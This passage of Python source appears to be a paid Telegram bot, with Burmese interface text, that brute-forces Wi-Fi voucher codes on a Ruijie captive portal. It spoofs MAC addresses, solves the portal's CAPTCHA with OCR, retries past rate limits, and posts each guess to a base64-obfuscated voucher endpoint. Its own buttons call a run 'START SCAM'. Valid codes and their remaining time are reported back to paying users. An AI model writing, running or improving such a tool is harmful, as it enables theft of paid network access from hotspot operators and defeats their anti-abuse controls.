                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                    get_back_keyboard(),
                )
                return
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔄 Recheck စတင်နေပါသည်...",
                get_scam_button_keyboard(),
            )
            await cmd_recheck(call.message)
            return

        if data == "menu_stop":
            d = scan_tasks.get(chat_id)
            if d and not d["task"].done():
                d["stop"] = True
                d["scan_id"] = None
                await _send_success_file(chat_id)
                d["task"].cancel()
                cleanup_scan_state(chat_id)
                try:
                    await bot.answer_callback_query(
                        call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True
                    )
                except Exception:
                    pass
            else:
                try:
                    await bot.answer_callback_query(call.id, "Scan မရှိပါ။", show_alert=True)
                except Exception:
                    pass
            return

        if data.startswith("scan_"):
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            mode = data.replace("scan_", "")
            user_data.setdefault(chat_id, {})
            if "session_url" not in user_data[chat_id]:
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                    get_back_keyboard(),
                )
                return
            if mode in ("6", "7", "8", "9"):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
                    get_digit_keyboard(mode),
                )
                return
            user_data[chat_id]["selected_mode"] = mode
            user_data[chat_id]["start_digit"] = None
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 VOUCHER: {mode}\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
                get_start_scam_keyboard(),
            )
            return

        if data.startswith("digit_"):
            parts = data.split("_", 2)
            if len(parts) != 3:
                return
            _, mode, digit = parts
            user_data.setdefault(chat_id, {})
            user_data[chat_id]["selected_mode"] = mode
            user_data[chat_id]["start_digit"] = None if digit == "random" else digit
            label = "Random" if digit == "random" else f"{digit} မှစ၍"
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 VOUCHER: {mode}\n🔢 ထိပ်စီး: {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
                get_start_scam_keyboard(),
            )
            return

        if data == "menu_start_scam":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            if chat_id not in user_data or "selected_mode" not in user_data.get(chat_id, {}):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    "❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
                    get_voucher_keyboard(),
                )
                return
            mode = user_data[chat_id]["selected_mode"]
            await safe_edit_text(
                chat_id, call.message.message_id,
                f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: {mode}",
                get_scam_button_keyboard(),
            )
            await _start_scan(chat_id, mode, message=call.message, user_name=user_name)
            return

    except Exception as e:
        log.exception("callback error data=%s: %s", data, e)
    finally:
        try:
            await bot.answer_callback_query(call.id)
        except Exception:
            pass

# ============================================================
# CODE GENERATORS
# ============================================================
_LOWER = string.ascii_lowercase
_LOWER_DIGIT = string.ascii_lowercase + string.digits

def _rand_digits(n: int) -> str:
    return "".join(random.choices(string.digits, k=n))

def _rand_lower(n: int) -> str:
    return "".join(random.choices(_LOWER, k=n))

def _rand_mixed(n: int) -> str:
    return "".join(random.choices(_LOWER_DIGIT, k=n))

def iter_codes(mode: str, start_digit: Optional[str] = None) -> Iterator[str]:
    """Streaming generator — no huge lists in RAM."""
    if mode in ("6", "7", "8", "9"):
        length = int(mode)
        if length == 9:
            while True:
                yield _rand_digits(9)
            return

        if start_digit is not None and str(start_digit).isdigit():
            d = int(start_digit)
            start = d * (10 ** (length - 1))
            end = (d + 1) * (10 ** (length - 1))
        else:
            start, end = 0, 10 ** length

        for i in range(start, end):
            yield str(i).zfill(length)
        return

    if mode == "ascii-lower":
        while True:
            yield _rand_lower(6)
    if mode == "ascii-lower9":
        while True:
            yield _rand_lower(9)
    if mode in ("all", "mixed"):
        while True:
            yield _rand_mixed(6)
    if mode == "mixed8":
        while True:
            yield _rand_mixed(8)
    if mode == "mixed9":
        while True:
            yield _rand_mixed(9)

    raise ValueError(f"Unsupported scan mode: {mode}")

# ============================================================
# PROGRESS FORMAT
# ============================================================
def format_progress(checked: int, total: Optional[int], speed: float, found: int) -> str:
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_len = 20
        pct = (checked / total) * 100 if total else 0
        filled = min(bar_len, int(pct / 5))
        bar = "█" * filled + "░" * (bar_len - filled)
        return (
            "🔍 Voucher Code ရှာဖွေနေသည်...\n\n"
            f"📦 စစ်ဆေးနေသည် : {checked:,}/{total:,}\n"
            f"📊 Progress : {pct:.2f}%\n"
            f"⚡ အမြန်နှုန်း : {speed_str}\n"
            f"✅ Success code hit : {found}\n"
            f"[{bar}]"
        )
    return (
        "🔍 Voucher Code ရှာဖွေနေသည်...\n\n"
        f"📦 စစ်ဆေးနေသည် : {checked:,}\n"
        f"⚡ အမြန်နှုန်း : {speed_str}\n"
        f"✅ Success code hit : {found}\n"
        "📊 Status : running\n"
    )

# ============================================================
# SESSION / MAC
# ============================================================
_UA_HTML = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
)

async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
                         previous_session_id: Optional[str] = None) -> Optional[str]:
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "referer": url,
        "user-agent": _UA_HTML,
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            final = str(req.url)
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final)
            return m.group(1) if m else previous_session_id
    except Exception as e:
        log.debug("get_session_id failed: %s", e)
        return previous_session_id

# ============================================================
# CAPTCHA
# ============================================================
async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": _UA_HTML,
    }
    params = {"sessionId": session_id, "_t": str(time.time())}
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params, headers=headers,
    ) as req:
        return await req.read()

async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str) -> Optional[str]:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": _UA_HTML,
    }
    payload = {"sessionId": session_id, "authCode": text}
    try:
        async with sess.post(
            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
            headers=headers, json=payload,
        ) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception as e:
        log.debug("captcha verify failed: %s", e)
        return None

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes: bytes) -> Optional[str]:
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode(".png", thresh)
    try:
        return _ocr.classification(buf.tobytes()).upper()
    except Exception as e:
        log.debug("ocr error: %s", e)
        return None

async def Captcha_Text(image_bytes: bytes) -> Optional[str]:
    try:
        return await asyncio.to_thread(_ocr_sync, image_bytes)
    except Exception as e:
        log.debug("captcha_text error: %s", e)
        return None

# ============================================================
# VOUCHER BALANCE
# ============================================================
async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
    paths = [
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}",
    ]
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json;",
        "user-agent": _UA_HTML,
        "x-requested-with": "XMLHttpRequest",
    }
    timeout = aiohttp.ClientTimeout(total=10)
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout,
        ) as s:
            for url in paths:
                try:
                    async with s.get(url, headers=headers) as req:
                        if req.status != 200:
                            continue
                        resp = await req.json()
                        if not resp.get("success"):
                            continue
                        result = resp.get("result", {}) or {}
                        mins = result.get("totalMinutes")
                        if mins is None:
                            mins = result.get("remainingMinutes", "Unknown")
                        profile = result.get("profileName", "Unknown")
                        return f"📋 Plan: {profile} | ⏳ Time: {minute_to_hour(mins)}", mins
                except Exception as e:
                    log.debug("balance path error: %s", e)
    except Exception as e:
        log.debug("Code_Expires_Date outer error: %s", e)
    return "📋 Plan: Unknown | ⏳ Time: Unknown", "Unknown"

# ============================================================
# PERFORM CHECK
# ============================================================
_POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

async def perform_check(session_url: str, code: str, chat_id: int,
                        scan_id: Optional[str] = None, recheck: bool = False,
                        message=None) -> Optional[str]:
    if not recheck:
        current = scan_tasks.get(chat_id)
        if not current or current.get("scan_id") != scan_id:
            return None

    post_headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        ),
    }

    response: Optional[str] = None
    session_id: Optional[str] = None

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(), timeout=timeout,
            ) as sess:
                session_id = await get_session_id(sess, session_url, None)
                if not session_id:
                    await asyncio.sleep(0.2)
                    continue

                auth_code = None
                for _ in range(6):
                    try:
                        img = await Captcha_Image(sess, session_id)
                        txt = await Captcha_Text(img)
                        if not txt:
                            continue
                        if await Varify_Captcha(sess, session_id, txt):
                            auth_code = txt
                            break
                    except Exception as e:
                        log.debug("captcha attempt error: %s", e)

                if not auth_code:
                    await asyncio.sleep(0.2)
                    continue

                if not recheck:
                    current = scan_tasks.get(chat_id)
                    if not current or current.get("scan_id") != scan_id or current.get("stop"):
                        return None

                payload = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                post_headers["referer"] = (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                )

                async with sess.post(_POST_URL, json=payload, headers=post_headers) as req:
                    response = await req.text()

        except Exception as e:
            log.debug("perform_check attempt %d: %s", attempt + 1, e)
            continue

        if response and "request limited" in response:
            await asyncio.sleep(0.5)
            continue
        break

    if not response:
        return None

    # --- SUCCESS ---
    if "logonUrl" in response:
        if recheck:
            return code

        expire_display, _raw = await Code_Expires_Date(session_id)
        entry = f"🎫 {code}\n   {expire_display}"

        success_texts.setdefault(chat_id, []).append(entry)
        user_data.setdefault(chat_id, {}).setdefault("current_display_codes", []).append(entry)

        await db_add_result(str(chat_id), code)

        if message is not None:
            try:
                display_codes = user_data[chat_id]["current_display_codes"]
                body = "\n\n".join(display_codes)
                if len(body) > 4000:
                    display_codes = [entry]
                    user_data[chat_id]["current_display_codes"] = display_codes
                    body = entry
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"Success Codes:\n\n{body}")
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            text=f"Success Codes:\n\n{body}",
                            chat_id=chat_id,
                            message_id=success_messages[chat_id],
                        )
                    except Exception:
                        sent = await bot.send_message(chat_id, f"Success Codes:\n\n{body}")
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                log.warning("success message error: %s", e)

    # --- LIMITED (STA) ---
    elif "STA" in response:
        limited_texts.setdefault(chat_id, []).append(code)
        if message is not None:
            try:
                body = "\n".join(limited_texts[chat_id])
                if len(body) > 4000:
                    body = body[-4000:]
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{body}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            text=f"Limited Codes:\n\n{body}",
                            chat_id=chat_id,
                            message_id=limited_messages[chat_id],
                        )
                    except Exception:
                        sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{body}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                log.warning("limited message error: %s", e)

    return None

# ============================================================
# RUN BRUTEFORCE
# ============================================================
async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str,
                         message=None, progress_msg=None,
                         start_digit: Optional[str] = None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await safe_send(chat_id, str(e))
        await release_scan_slot()
        return

    total: Optional[int] = 10 ** int(mode) if mode in ("6", "7", "8") else None
    checked = 0
    scan_start = time.monotonic()
    last_key_check = scan_start

    try:
        sem = await get_voucher_sem()

        while True:
            current = scan_tasks.get(chat_id)
            if not current or current.get("scan_id") != scan_id or current.get("stop"):
                return

            batch: List[str] = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            # Periodic key check
            if time.monotonic() - last_key_check >= KEY_RECHECK_INTERVAL:
                if not await is_paid(str(chat_id)):
                    await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    return
                last_key_check = time.monotonic()

            async def _check(c: str):
                async with sem:
                    cur = scan_tasks.get(chat_id)
                    if not cur or cur.get("scan_id") != scan_id:
                        return
                    await perform_check(session_url, c, chat_id, scan_id, message=message)

            await asyncio.gather(*(_check(c) for c in batch), return_exceptions=True)
            checked += len(batch)

            # progress update
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found)

            if progress_msg is not None:
                ok = await safe_edit_text(chat_id, progress_msg.message_id, text)
                if not ok:
                    try:
                        new = await bot.send_message(chat_id, text)
                        progress_msg.message_id = new.message_id
                    except Exception as e:
                        log.debug("progress send error: %s", e)

        # Completed
        if progress_msg is not None:
            found = len(success_texts.get(chat_id, []))
            if total is not None:
                finish = (
                    "🔍 ရှာဖွေမှုပြီးဆုံးပါပြီ\n\n"
                    f"📦 စစ်ဆေးမှု : {checked:,}/{total:,}\n"
                    f"✅ ရှာတွေ့ထားသော Code : {found}\n"
                    "📊 Progress : 100%\n[██████████████████]"
                )
            else:
                finish = (
                    "🔍 ရှာဖွေမှုပြီးဆုံးပါပြီ\n\n"
                    f"📦 စစ်ဆေးမှု : {checked:,}\n"
                    f"✅ ရှာတွေ့ထားသော Code : {found}\n"
                    "📊 Progress : 100%\n[██████████████████]"
                )
            ok = await safe_edit_text(chat_id, progress_msg.message_id, finish)
            if not ok:
                await safe_send(chat_id, finish)

        await _send_success_file(chat_id)

    except asyncio.CancelledError:
        log.info("scan cancelled chat_id=%s", chat_id)
        raise
    except Exception as e:
        log.exception("run_bruteforce fatal: %s", e)
    finally:
        await _send_success_file(chat_id)
        cleanup_scan_state(chat_id)
        await release_scan_slot()

# ============================================================
# SUCCESS FILE AUTO-SEND
# ============================================================
async def _send_success_file(chat_id: int) -> None:
    if str(chat_id) not in SUCCESS_FILE_TARGETS:
        return
    texts = success_texts.get(chat_id)
    if not texts:
        return
    fname = f"success_{chat_id}_{int(time.time())}.txt"
    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write("\n".join(texts))
        with open(fname, "rb") as f:
            await bot.send_document(
                chat_id, f,
                caption="✅ Scan ရပ်သွားသောကြောင့် Success Codes ဖိုင်။",
            )
    except Exception as e:
        log.debug("send_success_file error: %s", e)
    finally:
        try:
            if os.path.exists(fname):
                os.remove(fname)
        except Exception:
            pass

# ============================================================
# PORTAL URL VALIDATION
# ============================================================
async def check_session_url_improved(session_url: str, use_proxy: bool = False) -> bool:
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": _UA_HTML,
    }
    proxy = None  # proxies disabled by default
    if session is None:
        return False
    try:
        async with session.get(
            session_url, allow_redirects=True, headers=headers,
            proxy=proxy, timeout=15,
        ) as resp:
            if resp.status >= 400:
                return False
            final_url = str(resp.url)
            body = await resp.text()
            if "sessionId" in final_url or "sessionId" in body:
                return True
            for ind in ("portal-as.ruijienetworks.com", "maccauth",
                        "index.html", "lang=en_US"):
                if ind in final_url or ind in body:
                    return True
            patterns = [
                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
                r'[?&]sessionId=([a-zA-Z0-9]+)',
            ]
            for p in patterns:
                if re.search(p, body, re.I) or re.search(p, final_url, re.I):
                    return True
            if "portal" in body.lower() or "captcha" in body.lower():
                return True
            return False
    except asyncio.TimeoutError:
        log.debug("portal timeout: %s", session_url)
        return False
    except Exception as e:
        log.debug("portal check error: %s", e)
        return False

# ============================================================
# WEB SERVER
# ============================================================
async def _web_root(_request):
    return web.Response(text="Bot is awake and running 24/7!")

async def _web_health(_request):
    return web.json_response({"status": "ok", "uptime": int(time.monotonic() - _start_time)})

async def web_server():
    app = web.Application()
    app.router.add_get("/", _web_root)
    app.router.add_get("/health", _web_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
    await site.start()
    log.info("Web server listening on port %d", WEB_PORT)

# ============================================================
# POLLING (with proper timeouts)
# ============================================================
async def start_polling():
    backoff = 5
    while True:
        try:
            # timeout=30: Telegram long-poll window
            # request_timeout=90: aiohttp must survive past Telegram's window
            await bot.infinity_polling(timeout=30, request_timeout=90)
            return
        except asyncio.CancelledError:
            raise
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log.warning("Polling network error: %s. Reconnect in %ds", e, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log.exception("Polling error: %s. Reconnect in %ds", e, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ============================================================
# LIFECYCLE
# ============================================================
async def _on_shutdown():
    log.info("Shutting down…")
    for _chat_id, d in list(scan_tasks.items()):
        try:
            d["stop"] = True
            d["task"].cancel()
        except Exception:
            pass
    if session and not session.closed:
        try:
            await session.close()
        except Exception:
            pass
    if _connector and not _connector.closed:
        try:
            await _connector.close()
        except Exception:
            pass
    if _db_conn is not None:
        try:
            _db_conn.commit()
            _db_conn.close()
        except Exception:
            pass
    log.info("Shutdown complete.")

async def main():
    setup_logging()
    log.info("Starting STAR LINK bot …")

    _get_conn()
    await load_paid_users()

    # verify token quickly
    try:
        me = await bot.get_me()
        log.info("Bot authorized as @%s (id=%s)", me.username, me.id)
    except Exception as e:
        log.error("Bot token invalid or network unreachable: %s", e)

    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=20000, limit_per_host=10000, ttl_dns_cache=300, ssl=False,
    )
    session = aiohttp.ClientSession(
        timeout=timeout, connector=_connector, connector_owner=False,
    )

    asyncio.create_task(web_server())

    stop_event = asyncio.Event()

    def _signal_handler():
        stop_event.set()

    try:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, _signal_handler)
            except (NotImplementedError, RuntimeError):
                pass
    except Exception:
        pass

    polling_task = asyncio.create_task(start_polling())
    try:
        await stop_event.wait()
    except asyncio.CancelledError:
        pass
    finally:
        polling_task.cancel()
        try:
            await polling_task
        except (asyncio.CancelledError, Exception):
            pass
        await _on_shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
